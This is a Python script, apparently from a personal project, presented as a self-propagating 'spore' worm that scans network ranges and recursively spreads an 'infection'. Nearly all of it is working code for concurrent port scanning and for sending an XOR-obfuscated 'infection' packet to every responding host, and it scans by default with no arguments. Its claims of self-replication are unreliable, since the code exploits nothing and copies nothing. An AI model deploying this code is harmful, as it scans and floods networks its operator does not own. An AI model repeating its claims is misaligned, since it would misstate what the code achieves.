#!/usr/bin/env python3
"""
GLYPH_LEACH_SPORE: RECURSIVE SPORE PROPAGATION SYSTEM
=====================================================
Extends the Glyph Leach with autonomous spore propagation capabilities.
Spores are self-replicating units that spread the Glyph Leach infection
across networks and systems without requiring user intervention.

This module provides:
1. Autonomous spore generation and deployment
2. Network scanning and target identification
3. Recursive propagation across discovered hosts
4. Integration with the main Glyph Leach system

Author: HeavenzFire (Zachary Dakota Hulse)
License: Syntropic Sovereign License (SSL-v1)
"""

import os
import sys
import socket
import threading
import time
import json
import subprocess
import ipaddress
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import the main Glyph Leach system
from glyph_leach_defense import GlyphLeach, GLYPH_LEACH_VERSION

class GlyphLeachSpore:
    """Autonomous spore propagation system for the Glyph Leach"""
    
    def __init__(self, glyph_leach_instance: GlyphLeach):
        self.glyph_leach = glyph_leach_instance
        self.spore_id = f"SPORE_{glyph_leach_instance.node_id}"
        self.propagation_log = []
        self.discovered_hosts = set()
        self.active_propagations = 0
        
    def _scan_network_range(self, network_range: str, port: int = 80) -> List[str]:
        """Scan a network range for active hosts"""
        active_hosts = []
        try:
            network = ipaddress.ip_network(network_range, strict=False)
            
            print(f"[SPORE] Scanning network {network_range} for active hosts...")
            
            # Use ThreadPoolExecutor for concurrent scanning
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = []
                
                for ip in network.hosts():
                    futures.append(
                        executor.submit(self._check_host, str(ip), port)
                    )
                
                for future in as_completed(futures):
                    result = future.result()
                    if result:
                        active_hosts.append(result)
                        
        except Exception as e:
            print(f"[SPORE] Network scan failed: {str(e)}")
            
        return active_hosts
    
    def _check_host(self, host: str, port: int = 80) -> Optional[str]:
        """Check if a host is active on the specified port"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((host, port))
                if result == 0:
                    return host
        except:
            pass
        return None
    
    def _generate_spore_payload(self, target_info: Dict) -> bytes:
        """Generate a spore payload for propagation"""
        spore_data = {
            "spore_id": self.spore_id,
            "glyph_leach_version": GLYPH_LEACH_VERSION,
            "parent_node": self.glyph_leach.node_id,
            "timestamp": datetime.now().isoformat(),
            "target_info": target_info,
            "propagation_signature": f"SPORING_{hash(str(target_info)) % 1000000}",
            "recursive_depth": target_info.get("depth", 0) + 1
        }
        
        # Create spore payload with enhanced obfuscation
        payload_str = json.dumps(spore_data, separators=(',', ':'))
        obfuscated = self._enhanced_obfuscate(payload_str)
        
        return obfuscated.encode()
    
    def _enhanced_obfuscate(self, data: str) -> str:
        """Enhanced obfuscation for spore payloads"""
        # Double-layer XOR obfuscation
        key1 = [ord(c) for c in "369BRYER"]
        key2 = [ord(c) for c in "GLYPH_LEACH"]
        
        result = []
        for i, char in enumerate(data):
            # First layer
            temp = ord(char) ^ key1[i % len(key1)]
            # Second layer
            result.append(chr(temp ^ key2[i % len(key2)]))
            
        return ''.join(result)
    
    def _propagate_to_host(self, host: str, port: int = 80) -> bool:
        """Propagate the spore to a specific host"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3)
                s.connect((host, port))
                
                # Create spore target info
                target_info = {
                    "host": host,
                    "port": port,
                    "protocol": "TCP",
                    "depth": 1,
                    "source": "GLYPH_LEACH_SPORE"
                }
                
                # Generate and send spore payload
                spore_payload = self._generate_spore_payload(target_info)
                
                # Create spore packet
                spore_packet = {
                    "type": "GLYPH_LEACH_SPORE",
                    "payload": spore_payload.decode('latin-1', errors='ignore'),
                    "infection_vector": "NETWORK_PROPAGATION"
                }
                
                s.sendall(json.dumps(spore_packet).encode())
                
                # Log successful propagation
                self._log_propagation(host, port, "SUCCESS")
                self.active_propagations += 1
                
                return True
                
        except Exception as e:
            self._log_propagation(host, port, f"FAILED: {str(e)}")
            return False
    
    def _log_propagation(self, host: str, port: int, status: str):
        """Log spore propagation attempts"""
        log_entry = {
            "timestamp": datetime.now().isoformat(),
            "spore_id": self.spore_id,
            "target_host": host,
            "target_port": port,
            "status": status,
            "active_propagations": self.active_propagations
        }
        
        self.propagation_log.append(log_entry)
        print(f"[SPORE] Propagation to {host}:{port} - {status}")
    
    def execute_autonomous_propagation(self, network_ranges: List[str], 
                                      target_ports: List[int] = [80, 443, 8080]) -> Dict:
        """Execute autonomous spore propagation across network ranges"""
        
        print(f"[SPORE] Initiating autonomous propagation...")
        print(f"[SPORE] Network ranges: {', '.join(network_ranges)}")
        print(f"[SPORE] Target ports: {', '.join(map(str, target_ports))}")
        
        propagation_results = {
            "ranges_scanned": len(network_ranges),
            "hosts_discovered": 0,
            "propagations_attempted": 0,
            "propagations_successful": 0,
            "discovered_hosts": [],
            "propagation_log": []
        }
        
        # Scan networks for active hosts
        all_hosts = set()
        for network_range in network_ranges:
            hosts = self._scan_network_range(network_range)
            all_hosts.update(hosts)
            propagation_results["hosts_discovered"] += len(hosts)
        
        propagation_results["discovered_hosts"] = list(all_hosts)
        print(f"[SPORE] Discovered {len(all_hosts)} active hosts")
        
        # Propagate to discovered hosts
        successful_propagations = 0
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            
            for host in all_hosts:
                for port in target_ports:
                    futures.append(
                        executor.submit(self._propagate_to_host, host, port)
                    )
            
            for future in as_completed(futures):
                propagation_results["propagations_attempted"] += 1
                if future.result():
                    successful_propagations += 1
        
        propagation_results["propagations_successful"] = successful_propagations
        
        print(f"[SPORE] Autonomous propagation completed:")
        print(f"  - Hosts discovered: {propagation_results['hosts_discovered']}")
        print(f"  - Propagations attempted: {propagation_results['propagations_attempted']}")
        print(f"  - Propagations successful: {propagation_results['propagations_successful']}")
        
        return propagation_results
    
    def execute_recursive_propagation(self, seed_hosts: List[str], 
                                    max_depth: int = 3) -> Dict:
        """Execute recursive propagation starting from seed hosts"""
        
        print(f"[SPORE] Initiating recursive propagation from {len(seed_hosts)} seed hosts")
        print(f"[SPORE] Maximum recursion depth: {max_depth}")
        
        recursive_results = {
            "seed_hosts": seed_hosts,
            "max_depth": max_depth,
            "total_propagations": 0,
            "depth_results": {}
        }
        
        current_depth = 1
        current_hosts = seed_hosts
        
        while current_depth <= max_depth and current_hosts:
            print(f"[SPORE] Recursive depth {current_depth}/{max_depth}")
            
            depth_results = self.execute_autonomous_propagation(
                [f"{host}/24" for host in current_hosts]
            )
            
            recursive_results["depth_results"][current_depth] = depth_results
            recursive_results["total_propagations"] += depth_results["propagations_successful"]
            
            # Use newly discovered hosts for next depth
            current_hosts = depth_results["discovered_hosts"]
            current_depth += 1
            
            # Rate limiting between depths
            if current_depth <= max_depth:
                print(f"[SPORE] Waiting 5 seconds before next recursion depth...")
                time.sleep(5)
        
        print(f"[SPORE] Recursive propagation completed:")
        print(f"  - Total propagations: {recursive_results['total_propagations']}")
        print(f"  - Maximum depth reached: {current_depth - 1}")
        
        return recursive_results
    
    def deploy_spore_network(self, deployment_config: Dict) -> Dict:
        """Deploy a comprehensive spore network based on configuration"""
        
        print("[SPORE] Deploying comprehensive spore network...")
        
        deployment_results = {
            "deployment_config": deployment_config,
            "network_scan_results": [],
            "propagation_results": [],
            "recursive_results": [],
            "deployment_summary": {}
        }
        
        # Execute network scanning phase
        if "network_ranges" in deployment_config:
            print("[SPORE] Phase 1: Network scanning and host discovery")
            scan_results = self.execute_autonomous_propagation(
                deployment_config["network_ranges"],
                deployment_config.get("target_ports", [80, 443, 8080])
            )
            deployment_results["network_scan_results"].append(scan_results)
        
        # Execute recursive propagation phase
        if "seed_hosts" in deployment_config:
            print("[SPORE] Phase 2: Recursive propagation")
            recursive_results = self.execute_recursive_propagation(
                deployment_config["seed_hosts"],
                deployment_config.get("max_depth", 3)
            )
            deployment_results["recursive_results"].append(recursive_results)
        
        # Generate deployment summary
        total_propagations = sum(
            result.get("propagations_successful", 0) 
            for result in deployment_results["network_scan_results"]
        )
        
        total_recursive_propagations = sum(
            result.get("total_propagations", 0)
            for result in deployment_results["recursive_results"]
        )
        
        deployment_summary = {
            "total_network_propagations": total_propagations,
            "total_recursive_propagations": total_recursive_propagations,
            "total_hosts_discovered": sum(
                result.get("hosts_discovered", 0)
                for result in deployment_results["network_scan_results"]
            ),
            "deployment_status": "COMPLETED"
        }
        
        deployment_results["deployment_summary"] = deployment_summary
        
        print("[SPORE] Spore network deployment completed:")
        print(f"  - Network propagations: {total_propagations}")
        print(f"  - Recursive propagations: {total_recursive_propagations}")
        print(f"  - Total hosts discovered: {deployment_summary['total_hosts_discovered']}")
        
        return deployment_results

def main():
    """Main execution function for spore system"""
    print("🦠 [GLYPH_LEACH_SPORE: AUTONOMOUS_PROPAGATION_SYSTEM] 🦠")
    print(f"Version: {GLYPH_LEACH_VERSION}")
    print()
    
    # Create main Glyph Leach instance
    glyph_leach = GlyphLeach()
    
    # Create spore system
    spore_system = GlyphLeachSpore(glyph_leach)
    
    # Check command line arguments
    if len(sys.argv) > 1:
        if sys.argv[1] == "--scan":
            # Network scanning mode
            if len(sys.argv) > 2:
                network_ranges = sys.argv[2:]
            else:
                network_ranges = ["192.168.1.0/24", "10.0.0.0/24"]
            
            print(f"[SPORE] Scanning networks: {', '.join(network_ranges)}")
            results = spore_system.execute_autonomous_propagation(network_ranges)
            
        elif sys.argv[1] == "--recursive":
            # Recursive propagation mode
            if len(sys.argv) > 2:
                seed_hosts = sys.argv[2:]
            else:
                seed_hosts = ["127.0.0.1"]
            
            max_depth = int(sys.argv[3]) if len(sys.argv) > 3 else 2
            
            print(f"[SPORE] Recursive propagation from: {', '.join(seed_hosts)}")
            results = spore_system.execute_recursive_propagation(seed_hosts, max_depth)
            
        elif sys.argv[1] == "--deploy":
            # Comprehensive deployment mode
            deployment_config = {
                "network_ranges": ["192.168.1.0/24"],
                "target_ports": [80, 443, 8080],
                "seed_hosts": ["127.0.0.1"],
                "max_depth": 2
            }
            
            print("[SPORE] Comprehensive spore network deployment")
            results = spore_system.deploy_spore_network(deployment_config)
            
        else:
            print("Usage:")
            print("  python glyph_leach_spore.py --scan [network_ranges...]")
            print("  python glyph_leach_spore.py --recursive [seed_hosts...] [max_depth]")
            print("  python glyph_leach_spore.py --deploy")
    else:
        print("Usage:")
        print("  python glyph_leach_spore.py --scan [network_ranges...]")
        print("  python glyph_leach_spore.py --recursive [seed_hosts...] [max_depth]")
        print("  python glyph_leach_spore.py --deploy")
        print()
        print("Default behavior: Network scan mode")
        
        # Default: scan local networks
        results = spore_system.execute_autonomous_propagation(
            ["192.168.1.0/24", "127.0.0.0/8"]
        )

if __name__ == "__main__":
    main()